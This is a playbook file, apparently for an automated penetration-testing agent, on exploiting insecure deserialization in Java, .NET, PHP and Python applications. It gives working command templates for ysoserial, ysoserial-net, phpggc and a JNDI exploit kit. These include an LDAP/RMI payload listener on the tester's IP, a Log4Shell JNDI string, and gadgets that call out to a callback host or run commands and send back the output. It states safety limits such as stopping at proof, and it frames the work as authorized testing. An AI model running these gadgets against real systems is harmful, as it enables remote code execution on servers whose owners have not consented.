---
name: attack-deser
description: Insecure deserialization — a server reconstructs attacker-controlled serialized data, reaching a gadget chain that executes code or performs an unsafe action.
category: web-application
tags: [deserialization, deser, gadget-chain, rce, java, dotnet, python, php]
cwe_ids: [CWE-502]
chains_with: [oob-interactsh, attack-rce, attack-ognl, poc-standard]
tools: [ysoserial, ysoserial-net, phpggc, interactsh-client, curl, httpx]
version: "1.1"
---

# Insecure deserialization

## Objective
Prove the server deserializes attacker-controlled bytes into a gadget that runs code (or performs an
unsafe action). The proof is an **OOB callback** from the gadget or **command output** (`id`/`whoami`/
`hostname` only, per policy) — never "the blob was accepted" or a reflected base64 echo. All target HTTP
goes through the leash: `tools/leashed.sh $T bin/<tool> …`. Blind OOB (interactsh) runs direct.

## Fingerprints that make this live (requires)
- **Java:** `rO0AB...` (base64 `ac ed 00 05`), `Content-Type: application/x-java-serialized-object`,
  `__VIEWSTATE`-style blobs, `Set-Cookie` with a serialized session, Jackson/`@class`/`enableDefaultTyping`,
  `fastjson`/`autoType`, JMX/RMI/JNDI surfaces, a header/field later logged (log4j → `attack-rce`).
- **.NET:** `__VIEWSTATE` without MAC, `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter`, `TypeNameHandling`.
- **Python:** `pickle`/`cPickle` in a cookie/cache/param, `yaml.load` (not `safe_load`), `jsonpickle`.
- **PHP:** `unserialize()` on user input, `O:` / `a:` serialized strings, phar:// wrappers.

## Methodology
1. **Locate the sink.** Any field the server deserializes: cookies, `viewstate`, cache/queue payloads,
   `java.io.ObjectInputStream` endpoints, JSON APIs with polymorphic typing, import/restore features.
2. **Fingerprint the stack + the library** so you pick the right gadget (Commons-Collections, Spring,
   ROME, C3P0, JdbcRowSetImpl/JNDI for Jackson/fastjson; `ObjectDataProvider`/`TypeConfuseDelegate` for
   .NET; `__reduce__` for pickle).
3. **Prove it BLIND first (safest oracle).** Build a gadget whose only effect is an OOB fetch to a unique
   interactsh host (`bin/interactsh-client -json -o raw/deser/oob.jsonl`). Pick the generator by stack — all
   are INERT generators; you deliver the bytes through the leash and the callback is the oracle:
   - **Java** → `bin/ysoserial` if provisioned (`bin/ysoserial CommonsCollections6 'nslookup <token>.oob' | base64 -w0`,
     match the gadget to the detected library: CommonsCollections1-7, Spring1/2, ROME, C3P0, Hibernate...). If
     `bin/ysoserial` is absent (its standalone build is brittle), use **`bin/jndi-exploit-kit`** — it runs the
     LDAP/RMI payload server AND bundles ysoserial gadget generation, so it both GENERATES and DELIVERS:
     `bin/jndi-exploit-kit -L <your-ip>:1389 -J <your-ip>:8180 -C 'nslookup <token>.oob'` then point the sink's
     JNDI/`@class` at `ldap://<your-ip>:1389/...`. For Jackson/fastjson a `@class`→`JdbcRowSetImpl`/JNDI pointer
     at that listener. (Log4Shell `${jndi:ldap://<your-ip>:1389/x}` uses the same kit — see `attack-rce`.)
   - **.NET** → `bin/ysoserial-net` (ysoserial.net; native, 21 formatters): e.g.
     `bin/ysoserial-net -g TypeConfuseDelegate -f Json.Net -c "nslookup <token>.oob" -o base64`, or
     `-g ActivitySurrogateSelector -f BinaryFormatter` for ViewState/`BinaryFormatter`/`LosFormatter` sinks.
     List gadgets/formatters with `bin/ysoserial-net --fullhelp`. A leaked `__VIEWSTATE` MAC key = one-shot RCE.
   - **PHP** → `bin/phpggc` (~122 chains): `bin/phpggc <Framework>/RCE<n> system 'id' -b` (base64) or `-p phar`
     for a phar:// sink; `bin/phpggc -l <framework>` to list chains for the detected stack (Laravel/Symfony/
     WordPress/Monolog/Drupal...).
   - **Python** → a `__reduce__` pickle whose callable triggers the OOB; **YAML** → a `!!python/object/apply`.
   A callback = deserialization executed.
4. **Escalate to command output** ONLY within safe-PoC policy: swap the inert `nslookup <token>.oob` for a
   gadget that runs `id`/`hostname` and returns/exfils it. Command output mints `shell:<host>`+`foothold:<host>`
   (post-foothold stage fires next wave). Stop at proof — never a shell, never persistence.
5. **Non-exec gadgets still count.** A proven file-read / SSRF / property-set via the gadget is a finding
   at the impact it reaches (chain it: `attack-rce`, `attack-ssrf`).

## Red line
If proving it needs defeating an auth control as an attack, or the only path is destructive/box-crashing,
STOP and return `proven_state:"blocked"` (hand-off). Never brute a signing key; a MAC'd blob you cannot
forge legitimately is `blocked:safeguard`, not a dead end.

## What counts as a finding
- **Critical:** OOB callback from the gadget, or `id`/`whoami` command output returned.
- **High:** a proven non-exec primitive (file-read / SSRF / auth-object forge) via the deserializer.
- **Lead only:** the blob is accepted / reflected with no executed effect — `[UNCONFIRMED CANDIDATE]`.

## Evidence (under `raw/deser/`)
The injecting request + the serialized payload (or the exact `ysoserial`/builder invocation), the
interactsh callback line (unique token, proto, src-IP, ts) or the command output, the detected
library/gadget, and a runnable PoC that re-derives the effect. Oracle row: *SSRF / blind RCE / blind XXE
(OOB/credential-works)* or *RCE (command output)* in `proof/oracles`.
